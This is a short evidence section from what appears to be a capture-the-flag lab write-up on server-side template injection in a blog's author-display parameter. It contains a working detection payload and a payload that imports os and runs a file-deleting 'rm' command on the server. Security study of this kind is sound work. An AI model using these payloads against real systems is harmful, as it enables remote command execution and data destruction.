# 9. Evidence

## Detection Payload

```text
blog-post-author-display=user.name}}{{7*7}}
```

Result displayed:

```
Peter Wiener49}}
```

---

## Command Execution Payload

```text
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```

Reloading the blog post executed the injected template code, deleting the target file and solving the laboratory.

